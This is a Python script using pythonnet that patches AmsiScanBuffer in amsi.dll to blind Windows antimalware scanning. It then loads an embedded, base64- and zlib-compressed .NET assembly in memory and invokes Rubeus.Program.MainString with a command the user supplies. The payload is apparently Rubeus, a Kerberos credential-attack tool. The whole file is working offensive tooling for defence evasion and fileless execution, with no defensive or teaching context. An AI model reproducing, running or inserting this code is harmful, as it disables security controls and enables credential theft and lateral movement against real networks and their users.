import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()